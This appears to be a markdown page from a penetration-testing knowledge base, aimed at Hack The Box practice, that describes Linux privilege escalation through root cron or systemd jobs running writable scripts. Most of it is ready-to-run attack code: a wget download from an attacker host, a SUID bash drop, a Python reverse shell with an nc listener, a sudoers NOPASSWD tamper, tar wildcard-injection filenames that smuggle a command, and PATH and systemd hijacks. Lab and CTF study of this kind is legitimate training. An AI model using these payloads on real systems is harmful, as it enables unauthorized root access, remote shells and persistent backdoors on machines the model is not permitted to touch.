# Attack Pattern — Cron-Writable Script Linux Privesc

> A near-universal Linux easy/medium privesc on HTB. A scheduled task
> (cron / systemd) executes a script writable by your current user.

## Signature

```
non-root shell
  → pspy / file-stat reveals UID=0 process running on schedule
       → script invoked is writable by current user
            → append payload (SUID drop / reverse shell / sudoers tamper)
                 → wait one cycle → root
```

## When to suspect this template

- Easy / medium Linux box with no sudo allowance for current user.
- Files in `/scripts`, `/opt`, `/usr/local/bin`, `/var/www/<custom>`
  modified recently.
- Logs in `/var/log/<custom>` updating on a regular cadence.

## Step-by-step

### 1. Run pspy

```bash
wget http://atk/pspy64 -O /tmp/pspy64; chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000 | tee /tmp/pspy.log
# wait at least 60s
```

### 2. Identify root-spawned processes

```bash
grep 'UID=0' /tmp/pspy.log
# 2024/05/18 13:01:00 CMD: UID=0 PID=12345 /usr/bin/python /scripts/test.py
```

### 3. Check writability

```bash
ls -la /scripts/test.py
# -rw-r--r-- 1 scriptmanager scriptmanager  58 ... test.py
# (writable as scriptmanager — pivot to that user first)

# or directly as your current user:
ls -la <script>
# if mode contains `w` for current user / group → writable
```

### 4. Drop payload

Three universal payload options:

#### A. SUID bash drop (most reliable, no listener)

```bash
cat > /scripts/test.py <<'PY'
import os
os.system('chown root:root /tmp/.r 2>/dev/null; cp /bin/bash /tmp/.r; chmod 6755 /tmp/.r')
PY
# wait a cycle
ls -la /tmp/.r
# -rwsr-sr-x ...
/tmp/.r -p
# id → root (SUID + -p preserves euid)
```

#### B. Reverse shell

```bash
cat > /scripts/test.py <<'PY'
import socket,subprocess,os
s=socket.socket(); s.connect(("10.10.14.x",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
PY
# attacker
nc -lvnp 4444
# wait a cycle → root shell
```

#### C. Sudoers tamper (loudest)

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
# requires root to write /etc/sudoers; only works if cron-script writes
# files as root. Append via Python: open("/etc/sudoers","a").write(...)
```

### 5. Catch root

For SUID drop: `/tmp/.r -p`.
For reverse shell: stabilise the new shell (`pty.spawn`, `stty raw`).

### 6. Read flag

```bash
cat /root/root.txt
```

## Variants

### Variant A — Writable directory (not the script itself)

If `/scripts/` is writable but `test.py` isn't, a *symlink swap*
or *file-replacement* race may work:
```bash
mv /scripts/test.py /scripts/test.py.bak
cat > /scripts/test.py <<PY
... payload ...
PY
```

### Variant B — Wildcard injection (Tartarsauce / Networked)

Cron job: `tar -czf /tmp/backup.tgz /var/log/*`.
Drop crafted filenames in `/var/log/`:
```bash
cd /var/log
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo 'cp /bin/bash /tmp/r; chmod +s /tmp/r' > shell.sh; chmod +x shell.sh
```

### Variant C — PATH hijacking

Cron script calls binary by name (no full path); writable PATH dir
earlier in PATH lets you supply a malicious binary.

### Variant D — systemd timer instead of cron

Same exploitation, different scheduler:
```bash
systemctl list-timers --all
ls -la /etc/systemd/system/<service>.service
# if writable, modify ExecStart, then trigger or wait for next run
```

## Real HTB Examples

- **Bashed** — `/scripts/test.py` writable by scriptmanager; root cron
  runs it every minute.
- **Frolic** — different script path; same cron pattern.
- **Cronos** — DNS-based foothold, cron-driven privesc.
- **Networked** — wildcard injection variant.
- **Tartarsauce** — wildcard + tar checkpoint (the canonical example).
- **Postman** — different (Redis-driven), but post-foothold cron pattern.

## Anti-patterns

- Running pspy for less than a full cron period.
- Modifying a writable script that's never invoked by cron.
- Using a reverse shell when a SUID drop suffices.
- Forgetting to clean up after the privesc (leaves a backdoor).

## Related Skills

- [`linux-privesc/cron-writable-script.md`](../linux-privesc/cron-writable-script.md)
- [`linux-privesc/path-hijacking.md`](../linux-privesc/path-hijacking.md)
- [`linux-privesc/wildcard-injection.md`](../linux-privesc/wildcard-injection.md)
- [`tool-usage/pspy.md`](../tool-usage/pspy.md)
- [`methodology/06-linux-attack-flow.md`](../methodology/06-linux-attack-flow.md)
